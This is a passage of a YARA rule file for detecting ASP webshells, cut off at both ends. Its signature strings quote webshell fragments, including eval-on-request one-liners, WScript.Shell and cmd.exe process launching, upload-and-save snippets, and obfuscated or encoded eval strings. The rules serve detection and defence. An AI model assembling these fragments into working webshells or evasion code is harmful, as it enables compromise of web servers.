        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
        $asp_multi_payload_three2 = "Process" fullword wide ascii
        $asp_multi_payload_three3 = ".Start" wide ascii
        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii

        // execute cmd.exe /c with arguments using ProcessStartInfo
        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
        $asp_multi_payload_five2 = ".Start" nocase wide ascii
        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii


        //strings from private rule capa_asp_write_file
        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
        $asp_always_write1 = /\.write/ nocase wide ascii
        $asp_always_write2 = /\.swrite/ nocase wide ascii
        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
        $asp_cr_write1 = "CreateObject(" nocase wide ascii
        $asp_cr_write2 = "CreateObject (" nocase wide ascii
        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
        $asp_streamwriter2 = "filestream" fullword nocase wide ascii

    condition:
        (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and
        ( (
            any of ( $asp_payload* ) or
        all of ( $asp_multi_payload_one* ) or
        all of ( $asp_multi_payload_two* ) or
        all of ( $asp_multi_payload_three* ) or
        all of ( $asp_multi_payload_four* ) or
        all of ( $asp_multi_payload_five* )
        )
        or (
        any of ( $asp_always_write* ) and
        (
            any of ( $asp_write_way_one* ) and
            any of ( $asp_cr_write* )
        ) or (
            any of ( $asp_streamwriter* )
        )
        )
        ) and not any of ( $fp* ) and
        ( filesize < 200 or
        ( filesize < 1000 and any of ( $susasp* ) ) )
}

rule WEBSHELL_ASP_Encoded
{
    meta:
        description = "Webshell in VBscript or JScript encoded using *.Encode plus a suspicious string"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/03/14"
        modified = "2023-07-05"
        hash = "1bc7327f9d3dbff488e5b0b69a1b39dcb99b3399"
        hash = "9885ee1952b5ad9f84176c9570ad4f0e32461c92"
        hash = "27a020c5bc0dbabe889f436271df129627b02196"
        hash = "f41f8c82b155c3110fc1325e82b9ee92b741028b"
        hash = "af40f4c36e3723236c59dc02f28a3efb047d67dd"

        id = "67c0e1f6-6da5-569c-ab61-8b8607429471"
    strings:
        $encoded1 = "VBScript.Encode" nocase wide ascii
        $encoded2 = "JScript.Encode" nocase wide ascii
        $data1 = "#@~^" wide ascii
        $sus1 = "shell" nocase wide ascii
        $sus2 = "cmd" fullword wide ascii
        $sus3 = "password" fullword wide ascii
        $sus4 = "UserPass" fullword wide ascii

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


    condition:
        filesize < 500KB and (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and any of ( $encoded* ) and any of ( $data* ) and
        ( any of ( $sus* ) or
        ( filesize < 20KB and #data1 > 4 ) or
        ( filesize < 700 and #data1 > 0 ) )
}

rule WEBSHELL_ASP_Encoded_AspCoding
{
    meta:
        description = "ASP Webshell encoded using ASPEncodeDLL.AspCoding"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/03/14"
        modified = "2023-07-05"
        score = 60
        hash = "7cfd184ab099c4d60b13457140493b49c8ba61ee"
        hash = "f5095345ee085318235c11ae5869ae564d636a5342868d0935de7582ba3c7d7a"

        id = "788a8dae-bcb8-547c-ba17-e1f14bc28f34"
    strings:
        $encoded1 = "ASPEncodeDLL" fullword nocase wide ascii
        $encoded2 = ".Runt" nocase wide ascii
        $encoded3 = "Request" fullword nocase wide ascii
        $encoded4 = "Response" fullword nocase wide ascii
        $data1 = "AspCoding.EnCode" wide ascii
        //$sus1 = "shell" nocase wide ascii
        //$sus2 = "cmd" fullword wide ascii
        //$sus3 = "password" fullword wide ascii
        //$sus4 = "UserPass" fullword wide ascii

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


    condition:
        filesize < 500KB and (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and all of ( $encoded* ) and any of ( $data* )
}

rule WEBSHELL_ASP_By_String
{
    meta:
        description = "Known ASP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021-01-13"
        modified = "2023-04-05"
        hash = "f72252b13d7ded46f0a206f63a1c19a66449f216"
        hash = "bd75ac9a1d1f6bcb9a2c82b13ea28c0238360b3a7be909b2ed19d3c96e519d3d"
        hash = "56a54fe1f8023455800fd0740037d806709ffb9ece1eb9e7486ad3c3e3608d45"
        hash = "4ef5d8b51f13b36ce7047e373159d7bb42ca6c9da30fad22e083ab19364c9985"
        hash = "e90c3c270a44575c68d269b6cf78de14222f2cbc5fdfb07b9995eb567d906220"
        hash = "8a38835f179e71111663b19baade78cc3c9e1f6fcc87eb35009cbd09393cbc53"
        hash = "f2883e9461393b33feed4139c0fc10fcc72ff92924249eb7be83cb5b76f0f4ee"
        hash = "10cca59c7112dfb1c9104d352e0504f842efd4e05b228b6f34c2d4e13ffd0eb6"
        hash = "ed179e5d4d365b0332e9ffca83f66ee0afe1f1b5ac3c656ccd08179170a4d9f7"
        hash = "ce3273e98e478a7e95fccce0a3d3e8135c234a46f305867f2deacd4f0efa7338"
        hash = "65543373b8bd7656478fdf9ceeacb8490ff8976b1fefc754cd35c89940225bcf"
        hash = "de173ea8dcef777368089504a4af0804864295b75e51794038a6d70f2bcfc6f5"


        id = "4705b28b-2ffa-53d1-b727-1a9fc2a7dd69"
    strings:
        // reversed
        $asp_string1  = "tseuqer lave" wide ascii
        $asp_string2  = ":eval request(" wide ascii
        $asp_string3  = ":eval request(" wide ascii
        $asp_string4  = "SItEuRl=\"http://www.zjjv.com\"" wide ascii
        $asp_string5  = "ServerVariables(\"HTTP_HOST\"),\"gov.cn\"" wide ascii
        // e+k-v+k-a+k-l
        // e+x-v+x-a+x-l
        $asp_string6  = /e\+.-v\+.-a\+.-l/ wide ascii
        $asp_string7  = "r+x-e+x-q+x-u" wide ascii
        $asp_string8  = "add6bb58e139be10" fullword wide ascii
        $asp_string9  = "WebAdmin2Y.x.y(\"" wide ascii
        $asp_string10 = "<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[" wide ascii
        $asp_string11 = "<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request(" wide ascii
        // Request.Item["
        $asp_string12 = "UmVxdWVzdC5JdGVtWyJ" wide ascii

        // eval( in utf7 in base64 all 3 versions
        $asp_string13 = "UAdgBhAGwAKA" wide ascii
        $asp_string14 = "lAHYAYQBsACgA" wide ascii
        $asp_string15 = "ZQB2AGEAbAAoA" wide ascii
        // request in utf7 in base64 all 3 versions
        $asp_string16 = "IAZQBxAHUAZQBzAHQAKA" wide ascii
        $asp_string17 = "yAGUAcQB1AGUAcwB0ACgA" wide ascii
        $asp_string18 = "cgBlAHEAdQBlAHMAdAAoA" wide ascii

        $asp_string19 = "\"ev\"&\"al" wide ascii
        $asp_string20 = "\"Sc\"&\"ri\"&\"p" wide ascii
        $asp_string21 = "C\"&\"ont\"&\"" wide ascii
        $asp_string22 = "\"vb\"&\"sc" wide ascii
        $asp_string23 = "\"A\"&\"do\"&\"d" wide ascii
        $asp_string24 = "St\"&\"re\"&\"am\"" wide ascii
        $asp_string25 = "*/eval(" wide ascii
        $asp_string26 = "\"e\"&\"v\"&\"a\"&\"l" nocase
        $asp_string27 = "<%eval\"\"&(\"" nocase wide ascii
        $asp_string28 = "6877656D2B736972786677752B237E232C2A"  wide ascii
        $asp_string29 = "ws\"&\"cript.shell" wide ascii
        $asp_string30 = "SerVer.CreAtEoBjECT(\"ADODB.Stream\")" wide ascii
        $asp_string31 = "ASPShell - web based shell" wide ascii
        $asp_string32 = "<++ CmdAsp.asp ++>" wide ascii
        $asp_string33 = "\"scr\"&\"ipt\"" wide ascii
        $asp_string34 = "Regex regImg = new Regex(\"[a-z|A-Z]{1}:\\\\\\\\[a-z|A-Z| |0-9|\\u4e00-\\u9fa5|\\\\~|\\\\\\\\|_|{|}|\\\\.]*\");" wide ascii
        $asp_string35 = "\"she\"&\"ll." wide ascii
        $asp_string36 = "LH\"&\"TTP" wide ascii
        $asp_string37 = "<title>Web Sniffer</title>" wide ascii
        $asp_string38 = "<title>WebSniff" wide ascii
        $asp_string39 = "cript\"&\"ing" wide ascii
        $asp_string40 = "tcejbOmetsySeliF.gnitpircS" wide ascii
        $asp_string41 = "tcejbOetaerC.revreS" wide ascii
        $asp_string42 = "This file is part of A Black Path Toward The Sun (\"ABPTTS\")" wide ascii
        $asp_string43 = "if ((Request.Headers[headerNameKey] != null) && (Request.Headers[headerNameKey].Trim() == headerValueKey.Trim()))" wide ascii
        $asp_string44 = "if (request.getHeader(headerNameKey).toString().trim().equals(headerValueKey.trim()))" wide ascii
        $asp_string45 = "Response.Write(Server.HtmlEncode(ExcutemeuCmd(txtArg.Text)));" wide ascii
        $asp_string46 = "\"c\" + \"m\" + \"d\"" wide ascii
        $asp_string47 = "\".\"+\"e\"+\"x\"+\"e\"" wide ascii
        $asp_string48 = "Tas9er" fullword wide ascii
        $asp_string49 = "<%@ Page Language=\"\\u" wide ascii
        $asp_string50 = "BinaryRead(\\u" wide ascii
        $asp_string51 = "Request.\\u" wide ascii
        $asp_string52 = "System.Buffer.\\u" wide ascii
        $asp_string53 = "System.Net.\\u" wide ascii
        $asp_string54 = ".\\u0052\\u0065\\u0066\\u006c\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\"" wide ascii
        $asp_string55 = "\\u0041\\u0073\\u0073\\u0065\\u006d\\u0062\\u006c\\u0079.\\u004c\\u006f\\u0061\\u0064" wide ascii
        $asp_string56 = "\\U00000052\\U00000065\\U00000071\\U00000075\\U00000065\\U00000073\\U00000074[\"" wide ascii
        $asp_string57 = "*/\\U0000" wide ascii
        $asp_string58 = "\\U0000FFFA" wide ascii
        $asp_string59 = "\"e45e329feb5d925b\"" wide ascii
        $asp_string60 = ">POWER!shelled<" wide ascii
        $asp_string61 = "@requires xhEditor" wide ascii


        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


    condition:
        filesize < 200KB and (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and any of ( $asp_string* )
}

rule WEBSHELL_ASP_Sniffer
{
    meta:
        description = "ASP webshell which can sniff local traffic"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/03/14"
        modified = "2023-07-05"
        hash = "1206c22de8d51055a5e3841b4542fb13aa0f97dd"
        hash = "60d131af1ed23810dbc78f85ee32ffd863f8f0f4"
        hash = "c3bc4ab8076ef184c526eb7f16e08d41b4cec97e"
        hash = "ed5938c04f61795834751d44a383f8ca0ceac833"

        id = "b5704c19-fce1-5210-8185-4839c1c5a344"
    strings:
        $sniff1 = "Socket(" wide ascii
        $sniff2 = ".Bind(" wide ascii
        $sniff3 = ".SetSocketOption(" wide ascii
        $sniff4 = ".IOControl(" wide ascii
        $sniff5 = "PacketCaptureWriter" fullword wide ascii

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_asp_input
        // Request.BinaryRead
        // Request.Form
        $asp_input1 = "request" fullword nocase wide ascii
        $asp_input2 = "Page_Load" fullword nocase wide ascii
        // base64 of Request.Form(
        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
        $asp_xml_method1 = "GET" fullword wide ascii
        $asp_xml_method2 = "POST" fullword wide ascii
        $asp_xml_method3 = "HEAD" fullword wide ascii
        // dynamic form
        $asp_form1 = "<form " wide ascii
        $asp_form2 = "<Form " wide ascii
        $asp_form3 = "<FORM " wide ascii
        $asp_asp   = "<asp:" wide ascii
        $asp_text1 = ".text" wide ascii
        $asp_text2 = ".Text" wide ascii

    condition:
        (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and (
            any of ( $asp_input* ) or
        (
            $asp_xml_http and
            any of ( $asp_xml_method* )
        ) or
        (
            any of ( $asp_form* ) and
            any of ( $asp_text* ) and
            $asp_asp
        )
        )
        and filesize < 30KB and all of ( $sniff* )
}

rule WEBSHELL_ASP_Generic_Tiny
{
    meta:
        description = "Generic tiny ASP webshell which uses any eval/exec function indirectly on user input or writes a file"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-07-05"
        hash = "990e3f129b8ba409a819705276f8fa845b95dad0"
        hash = "52ce724580e533da983856c4ebe634336f5fd13a"
        hash = "0864f040a37c3e1cef0213df273870ed6a61e4bc"
        hash = "b184dc97b19485f734e3057e67007a16d47b2a62"

        id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
    strings:
        $fp1 = "net.rim.application.ipproxyservice.AdminCommand.execute"

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_asp_input
        // Request.BinaryRead
        // Request.Form
        $asp_input1 = "request" fullword nocase wide ascii
        $asp_input2 = "Page_Load" fullword nocase wide ascii
        // base64 of Request.Form(
        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
        $asp_xml_method1 = "GET" fullword wide ascii
        $asp_xml_method2 = "POST" fullword wide ascii
        $asp_xml_method3 = "HEAD" fullword wide ascii
        // dynamic form
        $asp_form1 = "<form " wide ascii
        $asp_form2 = "<Form " wide ascii
        $asp_form3 = "<FORM " wide ascii
        $asp_asp   = "<asp:" wide ascii
        $asp_text1 = ".text" wide ascii
        $asp_text2 = ".Text" wide ascii

        //strings from private rule capa_bin_files
        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
        $pack  = { 50 41 43 4b 00 00 00 02 00 }

        //strings from private rule capa_asp_payload
        $asp_payload0  = "eval_r" fullword nocase wide ascii
        $asp_payload1  = /\beval\s/ nocase wide ascii
        $asp_payload2  = /\beval\(/ nocase wide ascii
        $asp_payload3  = /\beval\"\"/ nocase wide ascii
        // var Fla = {'E':eval};  Fla.E(code)
        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
